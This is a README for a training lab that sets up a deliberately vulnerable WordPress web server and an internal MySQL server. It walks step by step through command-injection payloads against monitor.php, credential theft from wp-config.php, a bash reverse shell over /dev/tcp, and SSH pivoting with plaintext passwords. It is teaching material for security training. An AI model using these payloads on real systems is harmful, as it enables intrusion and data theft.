# Web + Database Lateral Movement Lab

This is a multi-machine scenario simulating a realistic enterprise DMZ architecture. The attacker compromises a public-facing web server via command injection, discovers database credentials in WordPress configuration files, pivots to the internal database server, and extracts sensitive data.

## Network Topology

```
┌──────────┐   10.0.0.0/24 (DMZ)   ┌───────────┐   10.0.1.0/24 (Internal)   ┌──────────┐
│ Attacker │◄──────────────────────►│ WebServer │◄────────────────────────────►│ DBServer │
│  (Kali)  │                        │ (Ubuntu)  │                              │ (Ubuntu) │
│ 10.0.0.1 │                        │ 10.0.0.2  │                              │ 10.0.1.2 │
└──────────┘                        │ 10.0.1.1  │                              └──────────┘
                                    └───────────┘
```

- **Attacker** can only reach the web server directly
- **WebServer** has two NICs, bridging DMZ and internal network (IP forwarding disabled)
- **DBServer** is internal only, firewalled to accept connections only from the web server

## Detailed Deploying Steps

### Deploy the Cyber Range Environment

1. In the "Model Editor" interface of the SPHERE platform, deploy the following model.
    ```python
    from mergexp import *

    net = Network('Web-DB-Lab', addressing==ipv4, routing==static)

    attacker = net.node('attacker', image=='kali', proc.cores>=8, memory.capacity>=gb(32))
    webserver = net.node('webserver', image=='2404', proc.cores==2, memory.capacity==gb(4))
    dbserver = net.node('dbserver', image=='2404', proc.cores==2, memory.capacity==gb(4))

    # External network (DMZ): attacker <-> webserver
    external = net.connect([attacker, webserver])
    external[attacker].socket.addrs  = ip4('10.0.0.1/24')
    external[webserver].socket.addrs = ip4('10.0.0.2/24')

    # Internal network: webserver <-> dbserver
    internal = net.connect([webserver, dbserver])
    internal[webserver].socket.addrs = ip4('10.0.1.1/24')
    internal[dbserver].socket.addrs  = ip4('10.0.1.2/24')

    experiment(net)
    ```

2. Create a Reservation based on that model.

3. Activate the Reservation.

4. If the Ubuntu 24.04 root disk is not automatically expanded, run on each victim machine:
    ```
    sudo partprobe
    sudo resize2fs /dev/vda3
    ```

### Deploy the Victim Machines

0. [Install Ansible](../setup_ansible/readme.md) on your XDC before proceeding.

1. The [`inventory.ini`](inventory.ini) is pre-configured to use SPHERE's DNS short names:
    ```ini
    [webserver]
    web-target ansible_host=webserver.infra ansible_user=lexuswang ansible_become_pass=lexuswang

    [dbserver]
    db-target ansible_host=dbserver.infra ansible_user=lexuswang ansible_become_pass=lexuswang

    [webserver:vars]
    ansible_python_interpreter=/usr/bin/python3

    [dbserver:vars]
    ansible_python_interpreter=/usr/bin/python3
    ```
    Update `ansible_user` and `ansible_become_pass` if your SPHERE username differs from `lexuswang`.

2. Run the playbooks:
    ```bash
    # Deploy database server first (web server depends on DB being ready)
    ansible-playbook -i inventory.ini dbserver_target.yml --ask-become-pass

    # Then deploy web server
    ansible-playbook -i inventory.ini webserver_target.yml --ask-become-pass
    ```

### Deploy the Attack Machine

Please refer to this [doc](../attacker_setup/readme.md) to set up the attack machine.

---

## Detailed Information about the Target System

### WebServer (10.0.0.2 / 10.0.1.1)

**Service:** Apache2 + WordPress + custom network monitoring tool

**Vulnerability:** OS command injection in `/monitor.php` — the `host` parameter is passed directly to `shell_exec()` without sanitization

**Port:** 80 (HTTP)

**URL:** `http://10.0.0.2/`

**Monitoring tool:** `http://10.0.0.2/monitor.php`

**Network hardening:**
- IP forwarding disabled (`net.ipv4.ip_forward=0`)
- Acts as the only gateway between DMZ and internal network

### DBServer (10.0.1.2)

**Service:** MySQL 8.x

**Port:** 3306 (MySQL), 22 (SSH)

**Firewall rules (iptables):**
- Allow SSH (22) from all sources (management)
- Allow MySQL (3306) only from `10.0.1.1` (webserver)
- Drop all other inbound traffic from experiment networks

**Sensitive data:** A `company` database containing a `users` table with credentials that are reused for SSH access.

### How the attack works

1. The web server hosts a custom network monitoring tool (`/monitor.php`) with a command injection vulnerability in the `host` parameter
2. The attacker injects OS commands, gaining code execution on the web server
3. On the web server, WordPress's `wp-config.php` contains MySQL credentials for the internal database server
4. The attacker uses the web server as a pivot to connect to MySQL on `10.0.1.2`
5. Inside MySQL, the `company.users` table contains plaintext passwords — one of which (`dbadmin`) is reused as an SSH password on the DB server
6. The attacker SSHs to the DB server from the web server, completing the lateral movement

---

## Testing (from attacker machine)

All commands run on the Kali attacker (`10.0.0.1`).

### Step 1: Recon

```bash
# Discover web server services
nmap -sV -p 80,443,8080 10.0.0.2

# Confirm attacker cannot reach DB server directly
nmap -Pn -p 3306,22 10.0.1.2   # should show filtered / unreachable

# Browse the web server
curl -s http://10.0.0.2/ | head -20
curl -s http://10.0.0.2/monitor.php | head -5
```

### Step 2: Command injection — initial access

```bash
# Test command injection
curl -s "http://10.0.0.2/monitor.php?host=;id"

# Read system info
curl -s "http://10.0.0.2/monitor.php?host=;whoami"
curl -s "http://10.0.0.2/monitor.php?host=;uname%20-a"
```

### Step 3: Discover database credentials

```bash
curl -s "http://10.0.0.2/monitor.php?host=;cat%20wp-config.php" | grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST"
```

This reveals: `DB_HOST` → `10.0.1.2`, `DB_USER` → `wp_user`, `DB_PASSWORD` → the MySQL password.

### Step 4: Pivot to internal database

```bash
# Query the company users table through command injection
curl -s "http://10.0.0.2/monitor.php?host=;mysql%20-h%2010.0.1.2%20-u%20wp_user%20-p'WpDb@2024Secure'%20company%20-e%20'SELECT%20*%20FROM%20users;'"
```

Note the `dbadmin` user's password — it is reused for SSH access on the DB server.

### Step 5: Reverse shell on web server

```bash
# Terminal 1: start listener on attacker
nc -lvnp 4444

# Terminal 2: trigger reverse shell via command injection
curl -s "http://10.0.0.2/monitor.php?host=;bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.0.0.1/4444%200>%261'"
```

### Step 6: Lateral movement to DB server

Once you have a reverse shell on the web server:

```bash
# Upgrade to interactive shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

# SSH to the database server using discovered credentials
ssh -o StrictHostKeyChecking=no dbadmin@10.0.1.2
# Password: S3cur3Passw0rd!

# Read the flag
cat ~/confidential_data.txt
```

---

## Attack Chain

1. **Recon:** Nmap finds HTTP on port 80; browsing reveals WordPress and `/monitor.php`
2. **Exploit:** Command injection via `host` parameter → RCE on web server
3. **Credential Discovery:** Read `wp-config.php` → MySQL credentials for internal DB
4. **Pivot:** Connect to internal MySQL (`10.0.1.2:3306`) from web server
5. **Data Exfiltration:** Dump `company.users` table → find `dbadmin` password (plaintext)
6. **Lateral Movement:** Reverse shell on web server → SSH to DB server with reused password
7. **Post-Exploitation:** Access `confidential_data.txt` on DB server — full compromise

---

## Credentials

| Machine | Account | Password | Notes |
|---------|---------|----------|-------|
| WebServer | SSH `lexuswang` | `lexuswang` | SPHERE default |
| WebServer | WP Admin `wpadmin` | `WpAdmin@2024` | WordPress admin panel |
| DBServer | MySQL `wp_user` | `WpDb@2024Secure` | Found in `wp-config.php` |
| DBServer | SSH `dbadmin` | `S3cur3Passw0rd!` | Found in `company.users` table (password reuse) |
